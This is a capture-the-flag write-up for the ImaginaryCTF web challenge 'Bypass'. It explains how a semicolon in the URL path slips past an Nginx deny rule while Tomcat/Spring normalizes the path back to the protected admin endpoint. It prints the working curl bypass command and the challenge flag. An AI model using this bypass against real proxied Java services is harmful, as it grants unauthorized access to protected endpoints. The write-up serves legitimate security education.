# Bypass — ImaginaryCTF Writeup

**Challenge:** Bypass  
**Category:** Web  
**Difficulty:** Medium  
**Points:** 100 pts  
**Flag:** `ictf{f0ll0w_th3_wh1t3_r4bb1t}`

---

## Description

> Press button → Get flag

---

## Background Knowledge (Read This First!)

### What is Nginx?

**Nginx** is a popular reverse proxy that sits in front of backend web apps. It can block or allow requests based on URL patterns. In this challenge, Nginx blocks access to `/api/admin/flag`.

### What is Spring / Tomcat?

**Spring** is a Java web framework. **Tomcat** is the Java servlet container running behind Nginx. Spring routes incoming requests using **AntPathMatcher** to match URL patterns.

### What is a path normalization mismatch?

This attack exploits the fact that **Nginx** and **Tomcat** clean up (normalize) URLs *differently*. If you craft a URL that Nginx does not recognize as `/api/admin/flag`, but Tomcat normalizes it *into* `/api/admin/flag`, the block is bypassed completely!

### What is a semicolon in a URL path?

In URLs, a **semicolon (`;`)** marks "matrix parameters" on a path segment:

- **Nginx** does NOT touch semicolons → the deny rule does NOT trigger
- **Tomcat** strips matrix parameters and normalizes:

```
/api;/admin/flag  →  /api//admin/flag  →  /api/admin/flag
```

Spring's `AntPathMatcher` then matches this cleaned path and serves the flag!

---

## Solution

### Step 1 — Try the normal URL (blocked)

```
┌──(zham㉿kali)-[~]
└─$ curl https://bypass.ictf.iciaran.com/api/admin/flag
# → 403 Forbidden
```

### Step 2 — Use the semicolon trick

```
┌──(zham㉿kali)-[~]
└─$ curl 'https://bypass.ictf.iciaran.com/api/;/admin/flag'
# → ictf{f0ll0w_th3_wh1t3_r4bb1t}
```

That is the entire exploit — one `curl` command! ✅

---

## How it Works

```
Your Request:  /api/;/admin/flag
                        │
               ┌────────▼────────┐
               │     NGINX       │
               │  Checks deny:   │
               │  /api/admin/flag│  ← Does NOT match (semicolon changes it)
               │  → NOT blocked  │
               └────────┬────────┘
                        │ Proxied as-is
               ┌────────▼────────┐
               │     TOMCAT      │
               │  Normalizes:    │
               │  /api/;/admin/  │
               │  → /api//admin/ │
               │  → /api/admin/  │
               └────────┬────────┘
                        │ Matches route
               ┌────────▼────────┐
               │     SPRING      │
               │  Serves flag ✅  │
               └─────────────────┘
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| `curl` | Send the crafted HTTP request | ⭐ Easy |
| Browser DevTools (optional) | Explore the site and find the endpoint | ⭐ Easy |

---

## Key Takeaways

- **Nginx ≠ Tomcat** when it comes to URL path normalization — never assume they agree
- Semicolons (`;`) in URL paths are "matrix parameters" and many proxies ignore them
- Always test path manipulation tricks when a reverse proxy sits in front of a Java backend
- "Press button → Get flag" means there is an API endpoint — find it and manipulate the path
